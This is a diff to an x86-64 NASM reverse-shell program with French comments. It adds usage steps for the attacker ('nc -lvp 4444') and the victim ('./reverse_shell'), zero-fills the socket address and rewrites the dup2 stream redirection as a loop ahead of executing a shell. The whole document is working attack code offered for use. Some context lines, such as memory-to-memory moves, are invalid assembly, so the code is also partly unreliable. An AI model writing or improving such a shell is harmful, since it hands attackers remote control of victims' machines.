@@ -5,6 +5,9 @@
 ; nasm -f elf64 -o reverse_shell.o reverse_shell.asm
 ; ld -o reverse_shell reverse_shell.o
 ;
+; Utilisation:
+; Sur la machine attaquante: nc -lvp 4444
+; Sur la machine victime: ./reverse_shell
 
 section .data
     ; Constantes pour les appels sys
@@ -47,7 +50,8 @@ section .text
     global _start
 
 _start:
-    mov qword [retry_count], 0
+    xor rax, rax
+    mov [retry_count], rax
 
 try_connect:
     ; Étape 1: Création du socket
@@ -63,10 +67,12 @@ try_connect:
     
     ; Sauvegarde du descripteur de socket
     mov [sockfd], rax
-    ; Remplissage de la structure
     mov word [sockaddr_in], AF_INET
     mov word [sockaddr_in + 2], [port]
     mov dword [sockaddr_in + 4], [ip]
+
+    xor rax, rax                       ; Remplir le reste avec des zéros
+    mov qword [sockaddr_in + 8], rax
 
     mov rax, SYS_CONNECT               ; connexion au serv
     mov rdi, [sockfd]                  ; descripteur de socket
@@ -75,25 +81,22 @@ try_connect:
     syscall
     test rax, rax
     js connect_error
-    
+
     ; la connexion est établie
     ; redirection des flux et exec du shell
+    ; Boucle pour rediriger STDIN, STDOUT, STDERR (0, 1, 2)
+    xor rsi, rsi                   ; Commencer par le descripteur 0 (STDIN)
+
+dup_loop:
     mov rax, SYS_DUP2
-    mov rdi, [sockfd]
-    xor rsi, rsi           ; STDIN = 0
-    syscall
+    mov rdi, [sockfd]              ; descripteur de socket
+    syscall                        ; rsi contient déjà le descripteur cible
     
-    ; Redirection de STDOUT (1)
-    mov rax, SYS_DUP2
-    mov rdi, [sockfd]
-    mov rsi, 1             ; STDOUT = 1
-    syscall
-    
-    ; Redirection de STDERR (2)
-    mov rax, SYS_DUP2
-    mov rdi, [sockfd]
-    mov rsi, 2             ; STDERR = 2
-    syscall
+    inc rsi                        ; descripteur suivant
+    cmp rsi, 3                     ; 3 descripteurs
+    jl dup_loop                    ; Si non, continuer
+
+    ; Maintenant que les flux sont redirigés, on passe à l'exécution du shell
 
     ; exec du shell
     mov rax, SYS_EXECVE
